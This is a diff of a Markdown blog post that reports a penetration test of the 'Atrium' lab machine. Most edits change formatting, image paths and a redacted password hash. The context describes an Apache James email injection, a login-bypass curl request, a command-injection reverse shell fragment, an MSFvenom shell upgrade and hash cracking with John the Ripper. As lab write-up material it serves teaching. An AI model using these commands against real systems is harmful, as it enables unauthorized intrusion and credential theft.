@@ -25,15 +25,11 @@ header:
 {: .align-center}
 
 **Skills Demonstrated**
-
-- **Reconnaissance & Scanning**: Nmap scanning, service and version enumeration.
-    
-- **Initial Access**: Client-side credential bypass, OS command injection via web form.
-    
-- **Shells & Post-Exploitation**: Netcat reverse shell, Meterpreter session setup, TTY shell upgrade.
-    
+- **Reconnaissance & Scanning**: Nmap scanning, service and version enumeration.    
+- **Initial Access**: Client-side credential bypass, OS command injection via web form.    
+- **Shells & Post-Exploitation**: Netcat reverse shell, Meterpreter session setup, TTY shell upgrade.  
 - **Privilege Escalation**: Kernel exploit (`4.4.0-87-generic`), local exploit enumeration with `Metasploit`, hash cracking (`/etc/shadow`).
-    
+  
 - **Tools**: Nmap, cURL, Netcat, Metasploit Framework, MSFvenom, Python HTTP Server. {: .notice--primary}
     
 
@@ -64,7 +60,7 @@ The project was divided into key phases:
 
 The purpose of this report is to detail each step of the process, highlight critical findings, and share lessons learned, demonstrating the practical application of the knowledge acquired throughout the program.
 
-> **Project Objective:** To perform reconnaissance, scanning, and identify potential vulnerabilities in a selected organization, and then execute controlled tests on a vulnerable machine. **Target Machine:** [Target Machine Atrium](https://mega.nz/file/4O0w3Tza#fGAUjHzRiGNmJY8Wlu9Mw3pC5ysP-P-nnBjvJVGTfqE) {: .notice--info}
+> **Project Objective:** To perform reconnaissance, scanning, and identify potential vulnerabilities in a selected organization, and then execute controlled tests on a vulnerable machine. **Target Machine:** [Target Machine Atrium](https://mega.nz/file/4O0w3Tza#fGAUjHzRiGNmJY8Wlu9Mw3pC5ysP-P-nnBjvJVGTfqE) 
 
 ---
 ![image-center](/assets/images/posts/atrium-report/atrium-project.png)
@@ -85,15 +81,15 @@ The first step was to establish connectivity and identify the target machine wit
 ![Netdiscover result 2](/assets/images/posts/atrium-report/netdiscover-2.png){: .align-center}
 
 
-A successful ping between the Kali machine and the victim confirmed network connectivity. {: .align-center}
+A successful ping between the Kali machine and the victim confirmed network connectivity. 
 
-The `netdiscover` scan allowed us to identify the target machine on the network. {: .align-center} {: .align-center}
+The `netdiscover` scan allowed us to identify the target machine on the network. 
 
 ![Netdiscover result 1](/assets/images/posts/atrium-report/netdiscover-1.png){: .align-center}
 
 ### Port and Service Scanning with Nmap
 
-A comprehensive Nmap scan was performed to identify all open ports, running services, and the operating system of the target. {: .align-center}
+A comprehensive Nmap scan was performed to identify all open ports, running services, and the operating system of the target. 
 ![Basic Nmap scan](/assets/images/posts/atrium-report/nmap-basic-scan.png){: .align-center}
 
 ### Detected Operating System:
@@ -125,11 +121,9 @@ Exportar a Hojas de cálculo
 - The **FTP service allows anonymous login** and contains a `flag.txt` file, which indicates a potential unauthenticated entry point.
     
 - The **Apache James server** is running three key services (SMTP, POP3, and NNTP) with **known vulnerabilities in version 2.3.2.1**, potentially allowing:
-    
+
     - User creation via telnet
-        
-    - Command injection through emails
-        
+    - Command injection through emails 
     - Possible Remote Code Execution (RCE)
         
 - The HTTP server has a `robots.txt` file that **restricts `/cyberacademy`**, which is a clear clue for targeted analysis (often pointing to sensitive directories or test environments).
@@ -137,7 +131,6 @@ Exportar a Hojas de cálculo
 - The operating system was identified as **Linux**, with a kernel version range between 3.2 and 4.14, commonly found in distributions such as Ubuntu 16.04 or similar.
     
 
----
 
 # 4. Phase 2 – Vulnerability Analysis and Exploitation
 
@@ -171,7 +164,7 @@ The attack involved sending a malicious email containing a JSP payload, which wo
 
 **Malicious Email:**
 
-```Ruby
+```bash
 HELO kali
 MAIL FROM:<hola@localhost>
 RCPT TO:<hola@localhost>
@@ -204,9 +197,7 @@ QUIT
     
 - **Vulnerability:** When a **POST** request with invalid credentials was submitted, the server responded with an **HTTP 200 OK** and directly disclosed the flag in the response body. This allowed a bypass of the login mechanism without a valid username or password.
 
-```bash
-curl -X POST http://192.168.0.18/login_2/index.php -d "login=admin&password=test" -i
-```
+`curl -X POST http://192.168.0.18/login_2/index.php -d "login=admin&password=test" -i`
 
 **Response:** `FLAGH{BYPASSING_HTTP_METH=DS_G00D!}`
 
@@ -237,6 +228,8 @@ During the assessment, some potential attack vectors were identified but proved 
 The goal of this exploitation was to obtain a **reverse shell** by leveraging the `/ping/` form parameter.
 
 - **Initial Tests:** Initial attempts with a standard bash reverse shell (`127.0.0.1; bash -i >`) were unsuccessful, likely due to filtering of special characters like `>`, `&`, and `"`.
+
+![RCE vulneravility find](/assets/images/posts/atrium-report/vuln-rce.png)
     
 - **Solution: URL-Encoded Payload:** To bypass the filtering, a classic bash reverse shell payload was **URL-encoded**.
     
@@ -256,7 +249,7 @@ The goal of this exploitation was to obtain a **reverse shell** by leveraging th
     ```
     
 - **Result:** The reverse connection was successfully established, and a remote shell from the victim machine was obtained.
-![RCE vulneravility find](/assets/images/posts/atrium-report/vuln-rce.png)
+![System acces granted](/assets/images/posts/atrium-report/reverseshell.png )
 
 ### Interactive Shell (TTY) Treatment
 
@@ -270,7 +263,7 @@ The initial remote shell was non-interactive. To gain a fully functional and sta
     
 4. **Set console dimensions**: `stty size` followed by `stty rows <rows_value> columns <columns_value>`.
     
-![System acces granted](/assets/images/posts/atrium-report/reverseshell.png )
+
 ### Upgrading the Shell with MSFvenom
 
 To transition to a more powerful **Meterpreter session**, a payload was generated using **MSFvenom** and transferred to the victim machine.
@@ -329,17 +322,18 @@ To identify potential privilege escalation vectors, tools like **LinPEAS** and *
     
 - The `/opt/james-2.3.2.1/bin/run.sh` script was being executed automatically. However, since it uses absolute paths, a `PATH` hijacking attack was not feasible.
     
-![Running LinPEAS](/assets/images/posts/atrium-report/)
-![PSPY output showing `run.sh`](/assets/images/posts/atrium-report/)
+![Running LinPEAS](/assets/images/posts/atrium-report/pspy1.png)
+
 ### Attempt to Crack Hashes
 
-The hash for the `deloitte` user was copied from `/etc/shadow` and passed to **John the Ripper** with a wordlist attack. **Hash:** `deloitte:$1$9ABWnCp/$jCaUM7F57.NTzp60E2x2d/:17507:0:99999:7:::`
+The hash for the `deloitte` user was copied from `/etc/shadow` and passed to **John the Ripper** with a wordlist attack. **Hash:** `deloitte:xxxxxWnCp/$jCaUM7F57.NTzp60E2x2d/:17507:0:99999:7:::`
 
 Bash
 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
 ```
+![Showing `run.sh`](/assets/images/posts/atrium-report/phoenix-run.png)
 
 This is a standard procedure to obtain plaintext passwords and gain access to other accounts.
 
